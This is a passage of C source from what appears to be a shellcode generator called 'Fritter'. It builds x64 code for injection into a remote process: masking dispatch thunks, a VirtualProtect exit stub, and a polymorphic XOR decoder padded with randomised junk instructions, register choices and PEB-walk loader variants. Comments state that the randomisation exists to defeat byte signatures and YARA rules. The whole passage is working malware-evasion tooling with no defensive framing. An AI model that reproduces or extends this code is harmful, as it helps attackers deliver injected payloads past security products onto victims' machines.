    p = mk_rip(p, pg, 0, 0xC7, 0, SLOT(FRITTER_MASK_FLAG), 4);            // mov dword [flag], nonzero
    *p++ = RB | 1; *p++ = RB; *p++ = RB; *p++ = RB;
    p = mk_vp(p, pg, 0, RB);
    JK;
    p = mk_vp(p, pg, 1, RB);
    *p++ = 0x48; *p++ = 0x83; *p++ = 0xC4; *p++ = 0x28;
    *p++ = 0x58;                                                          // pop rax
    p = mk_rip(p, pg, 0, 0xFF, 4, SLOT(FRITTER_MASK_IRET), 0);            // jmp [iret]
    p += RB & 0x1F;

    /* inbound: rax = tbase + 8 * thunk number */
    tbase = ((uint32_t)RB << 12) | ((uint32_t)RB << 4) | (RB & 0xF);
    incommon = p;
    p = mk_rip(p, pg, 0, 0x83, 7, SLOT(FRITTER_MASK_FLAG), 1);            // cmp dword [flag], 0
    *p++ = 0;
    *p++ = 0x74; je = p++;                                                // je forward (not masked)
    *p++ = 0x51; *p++ = 0x52; *p++ = 0x41; *p++ = 0x50;                   // push rcx, rdx, r8,
    *p++ = 0x41; *p++ = 0x51; *p++ = 0x50;                                //      r9, rax
    d = (int32_t)(unmask - (p + 5));
    *p++ = 0xE8; memcpy(p, &d, 4); p += 4;                                // call unmask
    *p++ = 0x58; *p++ = 0x41; *p++ = 0x59; *p++ = 0x41; *p++ = 0x58;      // pop rax, r9, r8,
    *p++ = 0x5A; *p++ = 0x59;                                             //     rdx, rcx
    JK;
    p = mk_rip(p, pg, 1, 0x8B, 10, SLOT(FRITTER_MASK_SP), 0);             // mov r10, [sp]
    *p++ = 0x49; *p++ = 0xC1; *p++ = 0xE2; *p++ = 0x03;                   // shl r10, 3
    p = mk_rip(p, pg, 1, 0x8D, 11, SLOT(FRITTER_MASK_STK), 0);            // lea r11, [stk]
    *p++ = 0x4D; *p++ = 0x01; *p++ = 0xDA;                                // add r10, r11
    *p++ = 0x4C; *p++ = 0x8B; *p++ = 0x1C; *p++ = 0x24;                   // mov r11, [rsp]
    *p++ = 0x4D; *p++ = 0x89; *p++ = 0x1A;                                // mov [r10], r11
    p = mk_rip(p, pg, 1, 0xFF, 0, SLOT(FRITTER_MASK_SP), 0);              // inc qword [sp]
    p = mk_rip(p, pg, 1, 0x8D, 11, (int32_t)(inback - pg), 0);            // lea r11, [inback]
    *p++ = 0x4C; *p++ = 0x89; *p++ = 0x1C; *p++ = 0x24;                   // mov [rsp], r11
    *je = (uint8_t)(p - (je + 1));
    p = mk_rip(p, pg, 1, 0x8D, 11, SLOT(FRITTER_MASK_TGT) - (int32_t)tbase, 0);   // forward: lea r11, [targets - tbase]
    *p++ = 0x41; *p++ = 0xFF; *p++ = 0x24; *p++ = 0x03;                   // jmp [r11+rax]
    p += RB & 0x1F;
    {
      /* the thunks: mov eax, tbase + 8k / jmp incommon / filler */
      uint16_t stride = (uint16_t)(10 + (RB & 3));
      uint32_t k, v;
      off = (uint16_t)(p - pg);
      memcpy(pg + 4, &off, 2);
      memcpy(pg + 6, &stride, 2);
      for(k = 0; k < FRITTER_MASK_NTGT; k++, p += stride) {
        if((p - pg) + stride > (int)MASK_PAGE) return 0;
        v = tbase + 8 * k;
        p[0] = 0xB8; memcpy(p + 1, &v, 4);
        d = (int32_t)(incommon - (p + 10));
        p[5] = 0xE9; memcpy(p + 6, &d, 4);
      }
    }
    p += RB & 0x1F;

    first = RB & 1;
    for(blk = 0; blk < 2; blk++) {
      off = (uint16_t)(p - pg);
      if(blk == first) {
        /* call entry */
        memcpy(pg, &off, 2);
        JK;
        for(i = 3; i > 0; i--) { j = RB % (i + 1); t = ar[i]; ar[i] = ar[j]; ar[j] = t; }
        for(i = 0; i < 4; i++) p = mk_rip(p, pg, 1, 0x89, ar[i], ARGSLOT(ar[i]), 0);   // save arguments
        *p++ = 0x48; *p++ = 0x8B; *p++ = 0x04; *p++ = 0x24;               // mov rax, [rsp]
        STK_PUSH_RAX;
        p = mk_rip(p, pg, 1, 0x8D, 0, (int32_t)(back - pg), 0);           // lea rax, [back]
        *p++ = 0x48; *p++ = 0x89; *p++ = 0x04; *p++ = 0x24;               // mov [rsp], rax
        JK;
        d = (int32_t)(crypt - (p + 5));
        *p++ = 0xE8; memcpy(p, &d, 4); p += 4;                            // call crypt
        p = mk_rip(p, pg, 0, 0xC7, 0, SLOT(FRITTER_MASK_FLAG), 4);        // mov dword [flag], nonzero
        *p++ = RB | 1; *p++ = RB; *p++ = RB; *p++ = RB;
        *p++ = 0x48; *p++ = 0x83; *p++ = 0xEC; *p++ = 0x28;
        p = mk_vp(p, pg, 0, RB);
        JK;
        p = mk_vp(p, pg, 1, RB);
        *p++ = 0x48; *p++ = 0x83; *p++ = 0xC4; *p++ = 0x28;
        for(i = 3; i > 0; i--) { j = RB % (i + 1); t = ar[i]; ar[i] = ar[j]; ar[j] = t; }
        for(i = 0; i < 4; i++) p = mk_rip(p, pg, 1, 0x8B, ar[i], ARGSLOT(ar[i]), 0);   // restore arguments
        JK;
        p = mk_rip(p, pg, 0, 0xFF, 4, SLOT(FRITTER_MASK_TARGET), 0);      // jmp [target]
      } else {
        /* exit entry */
        memcpy(pg + 2, &off, 2);
        JK;
        {
          static const uint8_t tr[5] = {0, 2, 8, 10, 11};                 // rcx holds the exit code
          uint8_t R = tr[RB % 5], w = 0x48 | ((R >> 3) << 2);
          if(RB & 1) {
            *p++ = 0x65; *p++ = w; *p++ = 0x8B; *p++ = 0x04 | ((R & 7) << 3); *p++ = 0x25;
            *p++ = 0x48; *p++ = 0; *p++ = 0; *p++ = 0;                    // mov R, gs:[0x48] (thread id)
          } else {
            *p++ = 0x65; *p++ = w; *p++ = 0x8B; *p++ = 0x04 | ((R & 7) << 3); *p++ = 0x25;
            *p++ = 0x30; *p++ = 0; *p++ = 0; *p++ = 0;                    // mov R, gs:[0x30] (TEB)
            JK;
            *p++ = 0x48 | ((R >> 3) << 2) | (R >> 3); *p++ = 0x8B;
            *p++ = 0x40 | ((R & 7) << 3) | (R & 7); *p++ = 0x48;          // mov R, [R+0x48]
          }
          JK;
          p = mk_rip(p, pg, 1, 0x3B, R, SLOT(FRITTER_MASK_TID), 0);       // cmp R, [tid]
        }
        *p++ = 0x75; jne = p++;                                           // jne other
        p = mk_rip(p, pg, 0, 0x83, 7, SLOT(FRITTER_MASK_FLAG), 1);        // cmp dword [flag], 0
        *p++ = 0;
        *p++ = 0x74; je = p++;                                            // je go
        JK;
        *p++ = 0x51;                                                      // push rcx
        JK;
        *p++ = 0x48; *p++ = 0x83; *p++ = 0xEC; *p++ = 0x20;
        d = (int32_t)(unmask - (p + 5));
        *p++ = 0xE8; memcpy(p, &d, 4); p += 4;                            // call unmask
        *p++ = 0x48; *p++ = 0x83; *p++ = 0xC4; *p++ = 0x20;
        *p++ = 0x59;                                                      // pop rcx
        *je = (uint8_t)(p - (je + 1));
        p = mk_rip(p, pg, 0, 0xFF, 4, SLOT(FRITTER_MASK_HOOK), 0);        // go: jmp [hook]
        *jne = (uint8_t)(p - (jne + 1));
        p = mk_rip(p, pg, 0, 0xFF, 4, SLOT(FRITTER_MASK_THREAD), 0);      // other: jmp [thread]
      }
      p += RB & 0x1F;
    }
    #undef RB
    #undef JK
    #undef SLOT
    #undef ARGSLOT
    #undef STK_PUSH_RAX
    #undef STK_POP_R10R11
    return (p - pg) <= (int)MASK_PAGE;
}

#define DISPATCHER_MAX_SIZE 640u

/* Emit the exit stub: the last code of the shellcode to run. The RSP-align
 * epilogue jumps here with the caller's stack already restored and
 * rax = the shim's exit block {VirtualProtect, base, size, scratch} (or 0).
 * It loads the arguments and JUMPS to VirtualProtect, which then returns
 * straight to whoever started the shellcode, so no page of ours has to stay
 * executable. Falls back to a plain RET when there is no block or the
 * caller's stack is not ABI-aligned. Returns bytes written (< 96). */
static uint32_t emit_exit_stub(uint8_t *out) {
    uint8_t *p = out, rnd[8], order[5] = {0,1,2,3,4};
    uint8_t *jz_at, *jne_at;
    gen_random(rnd, sizeof(rnd));
    uint8_t s1 = 2 + (rnd[0] & 1);        /* low3 of r10 / r11: alignment scratch */
    uint8_t s2 = 2 + ((rnd[0] >> 1) & 1); /* low3 of r10 / r11: jump target */

    #define XS_JUNK(i) do { if(rnd[i] & 1) p += emit_rnd_nop(p, 1 + ((rnd[i] >> 1) & 3)); } while(0)

    *p++ = 0x48; *p++ = 0x85; *p++ = 0xC0;              /* test rax, rax */
    *p++ = 0x74; jz_at = p++;                           /* jz ret */
    XS_JUNK(1);
    *p++ = 0x41; *p++ = 0x89; *p++ = 0xE0 | s1;         /* mov s1d, esp */
    *p++ = 0x41; *p++ = 0x83; *p++ = 0xE0 | s1; *p++ = 0x0F; /* and s1d, 15 */
    *p++ = 0x41; *p++ = 0x83; *p++ = 0xF8 | s1; *p++ = 0x08; /* cmp s1d, 8 */
    *p++ = 0x75; jne_at = p++;                          /* jne ret */

    for(int i = 4; i > 0; i--) {                        /* shuffle the five loads */
      int j = rnd[2 + (i & 3)] % (i + 1);
      uint8_t t = order[i]; order[i] = order[j]; order[j] = t;
    }
    for(int i = 0; i < 5; i++) {
      switch(order[i]) {
        case 0: *p++ = 0x48; *p++ = 0x8B; *p++ = 0x48; *p++ = 0x08; break;  /* mov rcx,[rax+8]  */
        case 1: *p++ = 0x48; *p++ = 0x8B; *p++ = 0x50; *p++ = 0x10; break;  /* mov rdx,[rax+16] */
        case 2: *p++ = 0x41; *p++ = 0xB8; *p++ = 0x04; *p++ = 0; *p++ = 0; *p++ = 0; break; /* mov r8d, PAGE_READWRITE */
        case 3: *p++ = 0x4C; *p++ = 0x8D; *p++ = 0x48; *p++ = 0x18; break;  /* lea r9,[rax+24]  */
        default:*p++ = 0x4C; *p++ = 0x8B; *p++ = (uint8_t)(s2 << 3); break; /* mov s2,[rax]     */
      }
      if(rnd[6] & (1u << i)) p += emit_rnd_nop(p, 1 + ((rnd[7] >> i) & 1));
    }
    *p++ = 0x48; *p++ = 0x83; *p++ = 0x20; *p++ = 0x00; /* and qword [rax], 0 */
    *p++ = 0x41; *p++ = 0xFF; *p++ = 0xE0 | s2;         /* jmp s2 */

    *jz_at  = (uint8_t)(p - (jz_at + 1));
    *jne_at = (uint8_t)(p - (jne_at + 1));
    *p++ = 0xC3;                                        /* ret */
    #undef XS_JUNK
    return (uint32_t)(p - out);
}

/* Must match MAX_FN_COUNT in loader/dispatch_shim.c. */
#define SHIM_MAX_FN_COUNT   16u

/**
 * Function: build_loader
 * ----------------------------
 *   Builds the shellcode that's injected into remote process.
 *
 *   INPUT  : Fritter configuration.
 *
 *   OUTPUT : Fritter error code.
 */
static int build_loader(PFRITTER_CONFIG c) {
    // RSP alignment is generated per output below: random save register
    // (RBX/RBP/R13/R14/R15), random save form (mov vs lea), random restore
    // form, and random junk between each instruction. Replaces three fixed
    // template variants whose bytes were enumerable signatures.

    // Safe junk pool - flag-only / reg-form NOPs. No memory, no stack,
    // no clobber of RCX. Used by the RSP-align generator and the decoder.
    static const struct { uint8_t b[4]; uint8_t n; } djunk[] = {
      {{0x90},                   1}, // nop
      {{0x66, 0x90},             2}, // 66 nop
      {{0x0F, 0x1F, 0xC0},      3}, // nop eax (reg-form)
      {{0xF8},                   1}, // clc
      {{0xF9},                   1}, // stc
      {{0xF5},                   1}, // cmc
    };
    #define DJUNK_COUNT 6

    // Junk instructions that preserve RCX (for insertion between POP and RSP_ALIGN)
    static unsigned char JUNK_NOP1[] = { 0x90 };                           // nop
    static unsigned char JUNK_NOP2[] = { 0x48, 0x87, 0xC0 };             // xchg rax,rax
    static unsigned char JUNK_NOP3[] = { 0x50, 0x58 };                   // push rax; pop rax
    static unsigned char JUNK_NOP4[] = { 0x0F, 0x1F, 0x00 };             // nop dword [rax]
    static unsigned char JUNK_NOP5[] = { 0x0F, 0x1F, 0x40, 0x00 };       // nop dword [rax+0]
    static unsigned char JUNK_NOP6[] = { 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00 }; // nop word [rax+rax+0]

    struct { unsigned char *p; uint32_t n; } junk_ops[] = {
        { JUNK_NOP1, sizeof(JUNK_NOP1) },
        { JUNK_NOP2, sizeof(JUNK_NOP2) },
        { JUNK_NOP3, sizeof(JUNK_NOP3) },
        { JUNK_NOP4, sizeof(JUNK_NOP4) },
        { JUNK_NOP5, sizeof(JUNK_NOP5) },
        { JUNK_NOP6, sizeof(JUNK_NOP6) },
    };
    #define NUM_JUNK_OPS 6

    uint8_t *pl;
    uint32_t t;
    uint8_t  rnd_byte;

    // --- Feature 6: Select random PEB walk loader variant ---
    unsigned char *loader_blob;
    uint32_t       loader_size;
    /* Companion tables for N>1 per-function dispatch. Matched to the
       chosen peb variant so fn_table offsets are consistent with the
       actual loader blob's section layout. */
    const fn_meta_t *L_FNS;
    uint32_t         L_FN_COUNT;
    const ref_t     *L_REFS;
    uint32_t         L_REF_COUNT;

    gen_random(&rnd_byte, 1);
    switch(rnd_byte % 2) {
      case 0:
        loader_blob = LOADER_PEB1_EXE_X64;
        loader_size = sizeof(LOADER_PEB1_EXE_X64);
        L_FNS       = LOADER_PEB1_FNS;
        L_FN_COUNT  = LOADER_PEB1_FN_COUNT;
        L_REFS      = LOADER_PEB1_REFS;
        L_REF_COUNT = LOADER_PEB1_REF_COUNT;
        DPRINT("Selected PEB walk order 1 (InMemoryOrderModuleList)");
        break;
      default:
        loader_blob = LOADER_PEB2_EXE_X64;
        loader_size = sizeof(LOADER_PEB2_EXE_X64);
        L_FNS       = LOADER_PEB2_FNS;
        L_FN_COUNT  = LOADER_PEB2_FN_COUNT;
        L_REFS      = LOADER_PEB2_REFS;
        L_REF_COUNT = LOADER_PEB2_REF_COUNT;
        DPRINT("Selected PEB walk order 2 (InInitializationOrderModuleList)");
        break;
    }

    // --- Feature 2A: Junk fall-through prefix (0-63 bytes, no jump) ---
    //
    // Per output, fill 0-63 bytes of NOP instructions with random content
    // in the disp fields. The bytes execute as no-ops and fall through to
    // the CALL - there is no "jump-over-junk" anchor (no leading EB/E9/etc.)
    // for YARA rules to position from.
    //
    // Uses emit_rnd_nop, which emits the 0F 1F /r multi-byte NOP family
    // with random disp bytes. On P6+ the CPU decodes NOP r/m for length
    // only and never dereferences the effective address, so the ModR/M/
    // SIB/disp bytes are free entropy, safe even when RAX is uninitialized
    // at entry. Chunk length also varies per iteration, so both the layout
    // and the bytes within each NOP differ across outputs.
    static uint8_t pfx_buf[64];
    uint32_t pfx_len = 0;
    gen_random(&rnd_byte, 1);
    uint32_t pfx_target = rnd_byte & 0x3F;   // 0..63
    while(pfx_len < pfx_target) {
      uint32_t remaining = pfx_target - pfx_len;
      uint32_t cap = remaining < 9 ? remaining : 9;
      gen_random(&rnd_byte, 1);
      uint32_t chunk = 1 + (rnd_byte % cap);   // 1..cap
      pfx_len += emit_rnd_nop(pfx_buf + pfx_len, chunk);
    }
    DPRINT("Prefix fall-through length: %u (target %u)", pfx_len, pfx_target);

    // --- Feature 2B: Generative RSP alignment routine ---
    // Layout emitted: [push reg] [save reg<-rsp] [and rsp,-16] [sub rsp,32]
    //                 [CALL rel32 disp=epi_size]
    //                 [restore rsp<-reg] [pop reg] [ret]
    // Junk inserted at 4 sites in prologue and 2 sites in epilogue.
    // Save register from {RBX,RBP,R13,R14,R15}; save and restore forms
    // (mov vs lea) chosen independently. CALL disp computed dynamically.

    static const uint8_t RSP_SAVE_REGS[] = { 3, 5, 13, 14, 15 }; // RBX,RBP,R13,R14,R15
    static uint8_t rsp_buf[128];
    uint32_t rsp_n = 0;

    gen_random(&rnd_byte, 1);
    uint8_t  rsp_save_reg = RSP_SAVE_REGS[rnd_byte % (sizeof(RSP_SAVE_REGS)/sizeof(RSP_SAVE_REGS[0]))];
    uint8_t  rsp_rex_b    = (rsp_save_reg >= 8) ? 1 : 0;
    uint8_t  rsp_reg3     = rsp_save_reg & 7;
    gen_random(&rnd_byte, 1);
    int rsp_save_form     = rnd_byte & 1;  // 0 = mov, 1 = lea
    gen_random(&rnd_byte, 1);
    int rsp_restore_form  = rnd_byte & 1;

    // Local junk emitter - params have leading underscore to avoid collision
    // with djunk[].n field referenced in the macro body.
    #define RSP_JUNK(_dst, _pos) do { \
      gen_random(&rnd_byte, 1); \
      int _jc = rnd_byte & 0x03; \
      for(int _j = 0; _j < _jc; _j++) { \
        gen_random(&rnd_byte, 1); \
        int _ji = rnd_byte % DJUNK_COUNT; \
        memcpy((_dst) + (_pos), djunk[_ji].b, djunk[_ji].n); \
        (_pos) += djunk[_ji].n; \
      } \
    } while(0)

    // Build epilogue first into a temp buffer so we know its size for CALL disp
    uint8_t epi_buf[64];
    uint32_t epi_n = 0;

    // restore: mov rsp,reg  OR  lea rsp,[reg+0]
    if (rsp_restore_form == 0) {
      epi_buf[epi_n++] = 0x48 | (rsp_rex_b ? 0x04 : 0); // REX.R for src
      epi_buf[epi_n++] = 0x89;
      epi_buf[epi_n++] = 0xC0 | (rsp_reg3 << 3) | 4;    // mod=11, reg=src, rm=4(rsp)
    } else {
      epi_buf[epi_n++] = 0x48 | (rsp_rex_b ? 0x01 : 0); // REX.B for r/m
      epi_buf[epi_n++] = 0x8D;
      epi_buf[epi_n++] = 0x40 | (4 << 3) | rsp_reg3;    // mod=01 disp8, reg=4(rsp dst), rm=src
      epi_buf[epi_n++] = 0x00;                          // disp8 = 0
    }
    RSP_JUNK(epi_buf, epi_n);

    // pop reg
    if (rsp_rex_b) epi_buf[epi_n++] = 0x41;
    epi_buf[epi_n++] = 0x58 | rsp_reg3;
    RSP_JUNK(epi_buf, epi_n);

    // jmp rel32 to the exit stub inside the encoded region (patched once
    // its position is known); the stub ends the run.
    epi_buf[epi_n++] = 0xE9;
    uint32_t epi_jmp_off = epi_n;
    epi_n += 4;

    // Now emit prologue into rsp_buf
    // push reg
    if (rsp_rex_b) rsp_buf[rsp_n++] = 0x41;
    rsp_buf[rsp_n++] = 0x50 | rsp_reg3;
    RSP_JUNK(rsp_buf, rsp_n);

    // save: mov reg,rsp  OR  lea reg,[rsp]
    if (rsp_save_form == 0) {
      rsp_buf[rsp_n++] = 0x48 | (rsp_rex_b ? 0x01 : 0); // REX.B for r/m=dst
      rsp_buf[rsp_n++] = 0x89;
      rsp_buf[rsp_n++] = 0xC0 | (4 << 3) | rsp_reg3;    // mod=11, reg=4(rsp src), rm=dst
    } else {
      rsp_buf[rsp_n++] = 0x48 | (rsp_rex_b ? 0x04 : 0); // REX.R for reg=dst
      rsp_buf[rsp_n++] = 0x8D;
      rsp_buf[rsp_n++] = (rsp_reg3 << 3) | 4;            // mod=00, reg=dst, rm=100 (SIB)
      rsp_buf[rsp_n++] = 0x24;                           // SIB: scale=0, idx=4(none), base=4(rsp)
    }
    RSP_JUNK(rsp_buf, rsp_n);

    // and rsp,-0x10 / -0x20 / -0x40 (the epilogue restores rsp from the
    // register, so any alignment >= 16 and any frame size will do)
    {
      static const uint8_t al[3] = {0xF0, 0xE0, 0xC0};
      uint8_t fr[2];
      gen_random(fr, 2);
      rsp_buf[rsp_n++] = 0x48; rsp_buf[rsp_n++] = 0x83;
      rsp_buf[rsp_n++] = 0xE4; rsp_buf[rsp_n++] = al[fr[0] % 3];
      RSP_JUNK(rsp_buf, rsp_n);

      // sub rsp,N  OR  add rsp,-N   (N = 0x20..0x70, multiple of 16)
      uint8_t frame = (uint8_t)(0x20 + 0x10 * ((fr[1] >> 1) % 6));
      rsp_buf[rsp_n++] = 0x48; rsp_buf[rsp_n++] = 0x83;
      if(fr[1] & 1) { rsp_buf[rsp_n++] = 0xEC; rsp_buf[rsp_n++] = frame; }
      else          { rsp_buf[rsp_n++] = 0xC4; rsp_buf[rsp_n++] = (uint8_t)(0x100 - frame); }
      RSP_JUNK(rsp_buf, rsp_n);
    }

    // CALL rel32, disp = epilogue size (skips over epilogue to fall into decoder)
    rsp_buf[rsp_n++] = 0xE8;
    {
      int32_t call_disp = (int32_t)epi_n;
      memcpy(rsp_buf + rsp_n, &call_disp, 4);
      rsp_n += 4;
    }

    // Append epilogue
    memcpy(rsp_buf + rsp_n, epi_buf, epi_n);
    uint32_t rsp_exit_disp_off = rsp_n + epi_jmp_off;
    rsp_n += epi_n;

    unsigned char *rsp_align      = rsp_buf;
    uint32_t       rsp_align_size = rsp_n;

    DPRINT("Generated RSP align: save_reg=%u save=%s restore=%s size=%u (epi=%u)",
           rsp_save_reg, rsp_save_form ? "lea" : "mov",
           rsp_restore_form ? "lea" : "mov", rsp_n, epi_n);

    // --- Feature 2D: Generative decoder→shim trampoline ---
    // Layout emitted: [LEA <reg>, [rip+disp32]]
    //                 [optional MOV RDX, <reg> if reg != RDX]
    //                 [junk 0..3 picks from djunk pool]
    //                 [JMP rel32 with disp=page_pad  OR  JMP RDX (FF E2)]
    // Replaces the static `48 8D 15 ?? ?? ?? ?? E9 ?? ?? ?? ??` pattern.
    // LEA disp and (if used) JMP disp are patched after page_pad is known.

    // Volatile registers only: this code runs before anything saves the
    // caller's non-volatile registers, and RCX holds the instance pointer.
    static const uint8_t TRAMP_LEA_REGS[] = { 0, 2, 8, 9, 10, 11 }; // RAX,RDX,R8-R11
    static uint8_t tramp_buf[64];
    uint32_t tramp_n = 0;
    uint32_t tramp_lea_disp_off = 0;
    uint32_t tramp_jmp_disp_off = 0;
    int      tramp_jmp_indirect = 0;

    gen_random(&rnd_byte, 1);
    uint8_t  tramp_reg    = TRAMP_LEA_REGS[rnd_byte % (sizeof(TRAMP_LEA_REGS)/sizeof(TRAMP_LEA_REGS[0]))];
    uint8_t  tramp_rex_r  = (tramp_reg >= 8) ? 1 : 0;
    uint8_t  tramp_reg3   = tramp_reg & 7;

    gen_random(&rnd_byte, 1);
    tramp_jmp_indirect = rnd_byte & 1;  // 0 = JMP rel32, 1 = JMP RDX

    // LEA <reg>, [rip+disp32] - REX.W (+ REX.R for r8-r15), 8D, ModRM(mod=00,reg=tgt,rm=5)
    tramp_buf[tramp_n++] = 0x48 | (tramp_rex_r ? 0x04 : 0);
    tramp_buf[tramp_n++] = 0x8D;
    tramp_buf[tramp_n++] = 0x05 | (tramp_reg3 << 3);
    tramp_lea_disp_off   = tramp_n;
    tramp_n += 4;  // disp32 placeholder

    // MOV RDX, <reg>  (only if target isn't already RDX)
    if (tramp_reg != 2) {
      tramp_buf[tramp_n++] = 0x48 | (tramp_rex_r ? 0x04 : 0);  // REX.W (+ REX.R for src)
      tramp_buf[tramp_n++] = 0x89;
      tramp_buf[tramp_n++] = 0xC0 | (tramp_reg3 << 3) | 2;     // mod=11, reg=src, rm=2(RDX)
    }

    // 0..3 djunk picks between MOV/LEA and JMP
    {
      gen_random(&rnd_byte, 1);
      int jcount = rnd_byte & 0x03;
      for (int j = 0; j < jcount; j++) {
        gen_random(&rnd_byte, 1);
        int jidx = rnd_byte % DJUNK_COUNT;
        memcpy(tramp_buf + tramp_n, djunk[jidx].b, djunk[jidx].n);
        tramp_n += djunk[jidx].n;
      }
    }

    // JMP form
    if (tramp_jmp_indirect) {
      // FF E2 - JMP RDX (2 bytes, no displacement)
      tramp_buf[tramp_n++] = 0xFF;
      tramp_buf[tramp_n++] = 0xE2;
    } else {
      // E9 disp32 - JMP rel32 (5 bytes, disp = page_pad, patched later)
      tramp_buf[tramp_n++] = 0xE9;
      tramp_jmp_disp_off   = tramp_n;
      tramp_n += 4;  // disp32 placeholder
    }

    uint32_t tramp_size = tramp_n;
    DPRINT("Trampoline: lea_reg=%u jmp=%s size=%u",
           tramp_reg, tramp_jmp_indirect ? "JMP RDX" : "JMP rel32", tramp_size);

    // --- Feature 2C: Random junk between POP and RSP_ALIGN (0-8 bytes) ---
    uint8_t junk_mid[8];
    uint32_t junk_mid_len = 0;
    {
      gen_random(&rnd_byte, 1);
      uint32_t target = rnd_byte & 0x07; // 0-7 bytes target
      while(junk_mid_len < target) {
        gen_random(&rnd_byte, 1);
        int idx = rnd_byte % NUM_JUNK_OPS;
        if(junk_mid_len + junk_ops[idx].n > 8) break;
        memcpy(junk_mid + junk_mid_len, junk_ops[idx].p, junk_ops[idx].n);
        junk_mid_len += junk_ops[idx].n;
      }
    }
    DPRINT("Junk mid length: %d", junk_mid_len);

    // --- Feature 1: Polymorphic XOR decoder stub ---
    //
    // Two-pass assembly: emit instructions with random junk between each,
    // random register allocation, then patch RIP-relative displacements.
    // Key stored at end of stub (no jmp-short needed).
    //
    // Layout: [push rcx] [junk]* [lea key_ptr,[rip+?]] [junk]* [lea data_ptr,[rip+?]]
    //         [junk]* [mov counter, size] [junk]* [xor idx,idx] [junk]*
    //         loop: [mov al,[key_ptr+idx]] [junk]* [xor [data_ptr],al] [junk]*
    //         [inc data_ptr] [junk]* [inc idx_8] [junk]* [and idx_8,7]
    //         [dec counter] [jnz loop] [junk]* [pop rcx] [8 key bytes]
    //         (fall through to decoded loader)

    // --- Keystream ---
    // The blob is XORed dword by dword with a 32-bit xorshift state. Seed
    // and shift triple are drawn per output and compiled into the decoder
    // as immediates: no key bytes follow the stub and no period shows in
    // the encoded data. The whole state is used for every dword: with only
    // its low byte, short windows of the stream are not unique and periodic
    // plaintext showed through as repeated ciphertext.
    fn_stream_t outer;
    uint32_t    outer_seed;
    gen_random(&rnd_byte, 1);
    memcpy(outer.sh, XS_TRIPLES[rnd_byte % 36], 3);
    outer.rev = 0;
    do { if(!gen_random(&outer_seed, 4)) return FRITTER_ERROR_RANDOM; } while(outer_seed == 0);

    // --- Where the pointer increment sits among the three state steps ---
    gen_random(&rnd_byte, 1);
    int loop_order = rnd_byte & 3;

    // --- Register selection ---
    // Roles: data_ptr, counter, state, temp.
    // RCX is pushed/popped (instance pointer) and reusable inside.
    // Volatile registers only (Win64): the decoder must not clobber the
    // caller's RBX/RSI/RDI, which nothing on this path saves. None of the
    // pool has low3 == 4 or 5, so no SIB/disp special cases arise, and the
    // low byte of each is addressable (CL/DL without REX, R8B-R11B with).
    // Pool: RCX(1), RDX(2), R8(0+REX), R9(1+REX), R10(2+REX), R11(3+REX)
    typedef struct { uint8_t reg3; uint8_t rex; } DREG;
    static const DREG dreg_pool[] = {
      {1,0}, {2,0}, {0,1}, {1,1}, {2,1}, {3,1} // rcx,rdx,r8,r9,r10,r11
    };
    #define DREG_POOL_SIZE 6

    int didx[DREG_POOL_SIZE] = {0,1,2,3,4,5};
    // Fisher-Yates shuffle
    for(int i = DREG_POOL_SIZE-1; i > 0; i--) {
      gen_random(&rnd_byte, 1);
      int j = rnd_byte % (i+1);
      int tmp = didx[i]; didx[i] = didx[j]; didx[j] = tmp;
    }
    DREG rDP  = dreg_pool[didx[0]]; // data pointer
    DREG rCNT = dreg_pool[didx[1]]; // loop counter
    DREG rK   = dreg_pool[didx[2]]; // keystream state
    DREG rTs[3] = { dreg_pool[didx[3]], dreg_pool[didx[4]], dreg_pool[didx[5]] }; // a temp per step

    // djunk[] / DJUNK_COUNT defined at top of function - shared with RSP-align gen

    // Helper: emit 0-3 random junk instructions into buf at offset ds
    #define EMIT_JUNK() do { \
      gen_random(&rnd_byte, 1); \
      int _jc = rnd_byte & 0x03; \
      for(int _j = 0; _j < _jc && ds < 480; _j++) { \
        gen_random(&rnd_byte, 1); \
        int _ji = rnd_byte % DJUNK_COUNT; \
        memcpy(db + ds, djunk[_ji].b, djunk[_ji].n); \
        ds += djunk[_ji].n; \
      } \
    } while(0)

    // Fixup tracking for RIP-relative displacements and JNZ
    #define FIXUP_DATA  1  // LEA data_ptr -> encoded loader (past end of stub)
    #define FIXUP_JNZ   2  // JNZ -> loop start
    #define MAX_FIXUPS  3
    int fixup_offset[MAX_FIXUPS];  // byte offset in db[] where displacement lives
    int fixup_end[MAX_FIXUPS];     // byte offset of end of instruction (RIP after)
    int loop_start = 0;

    uint8_t db[512]; // decoder buffer (generous)
    int ds = 0;

    // --- Pass 1: emit instructions with junk ---

    // Leading djunk - shifts `push rcx` (0x51) off byte 0 of the stub
    // so the call-site landing byte is no longer a stable anchor.
    EMIT_JUNK();

    // push rcx (preserve instance pointer)
    db[ds++] = 0x51;
    EMIT_JUNK();

    // The three set-ups are independent: emit them in a random order.
    gen_random(&rnd_byte, 1);
    int counter_imm_offset = 0, setup_first = rnd_byte % 3;   // EMIT_JUNK reuses rnd_byte
    for(int su = 0; su < 3; su++) {
      switch((su + setup_first) % 3) {
        case 0:
          // lea data_ptr, [rip+??] -> will point to encoded loader
          db[ds++] = 0x48 | (rDP.rex << 2);
          db[ds++] = 0x8D;
          db[ds++] = 0x05 | (rDP.reg3 << 3);
          fixup_offset[FIXUP_DATA] = ds;
          ds += 4;
          fixup_end[FIXUP_DATA] = ds;
          break;
        case 1:
          // mov counter_32, loader_size (re-patched to combined_size later)
          if(rCNT.rex) db[ds++] = 0x41;
          db[ds++] = 0xB8 + rCNT.reg3;
          counter_imm_offset = ds; // track offset of the 4-byte immediate
          memcpy(db + ds, &loader_size, 4);
          ds += 4;
          break;
        default:
          // mov state_32, seed
          if(rK.rex) db[ds++] = 0x41;
          db[ds++] = 0xB8 + rK.reg3;
          memcpy(db + ds, &outer_seed, 4);
          ds += 4;
          break;
      }
      EMIT_JUNK();
    }

    // === decode_loop: ===
    loop_start = ds;

    // xor [data_ptr], state_32
    {
      uint8_t rex = (uint8_t)((rK.rex << 2) | rDP.rex);
      if(rex) db[ds++] = 0x40 | rex;
      db[ds++] = 0x31; // XOR r/m32, r32
      db[ds++] = (rK.reg3 << 3) | rDP.reg3; // ModRM: mod=00, reg=state, rm=data_ptr
    }
    EMIT_JUNK();

    // add data_ptr, 4  OR  lea data_ptr, [data_ptr+4]
    #define EMIT_INC_DP() do { \
      gen_random(&rnd_byte, 1); \
      if(rnd_byte & 1) { \
        db[ds++] = 0x48 | rDP.rex; db[ds++] = 0x83; \
        db[ds++] = 0xC0 | rDP.reg3; db[ds++] = 4; \
      } else { \
